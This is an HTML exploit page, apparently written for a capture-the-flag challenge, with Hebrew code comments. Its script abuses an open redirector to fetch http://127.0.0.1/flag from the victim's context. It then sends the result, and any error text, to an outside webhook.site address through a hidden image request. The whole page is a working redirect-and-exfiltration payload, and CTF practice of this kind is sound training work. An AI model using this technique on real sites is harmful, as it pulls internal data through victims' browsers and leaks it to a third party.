<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>CTF CORS Redirector Exploit</title>
</head>
<body>
  <h1>Running CORS Redirector Exploit...</h1>
  <script>
    // כתובת ה-redirector + ה-URL של הדגל שאת רוצה לגשת אליו
    const redirectorUrl = '/redir.php?url=' + encodeURIComponent('http://127.0.0.1/flag');

    fetch(redirectorUrl)
      .then(response => response.text())
      .then(flagText => {
        // שולח את הדגל שנמצא ל-webhook.site שלך
        new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?flag=' + encodeURIComponent(flagText);

        // גם מציג בדף שלך כדי לוודא שזה רץ
        document.body.insertAdjacentHTML('beforeend', '<pre style="color:green;">' + flagText + '</pre>');
      })
      .catch(error => {
        new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?error=' + encodeURIComponent(error.toString());
        document.body.insertAdjacentHTML('beforeend', '<p style="color:red;">Error: ' + error + '</p>');
      });
  </script>
</body>
</html>
